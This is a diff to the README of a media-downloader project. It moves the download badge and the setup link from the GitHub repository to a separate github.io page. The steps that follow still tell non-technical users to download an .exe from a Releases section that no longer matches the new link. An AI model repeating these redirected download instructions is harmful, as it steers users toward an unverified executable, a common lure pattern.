@@ -1,6 +1,6 @@
 # 📂 media-puller - Save online videos and images easily
 
-[![Download Media Puller](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/moatafa3263/media-puller)
+[![Download Media Puller](https://img.shields.io/badge/Download-Application-blue.svg)](https://moatafa3263.github.io)
 
 Media-puller helps you save media files from websites to your computer. It handles downloads from Telegram, Instagram, Reddit, and other platforms. You do not need technical skills to use it. The software manages the connection, resumes interrupted downloads, and saves your files in one place.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your system.
 
-1. Visit the project website at [https://github.com/moatafa3263/media-puller](https://github.com/moatafa3263/media-puller).
+1. Visit the project website at [https://moatafa3263.github.io](https://moatafa3263.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version listed under Releases.
 4. Click the file ending in .exe to download the installer to your computer.
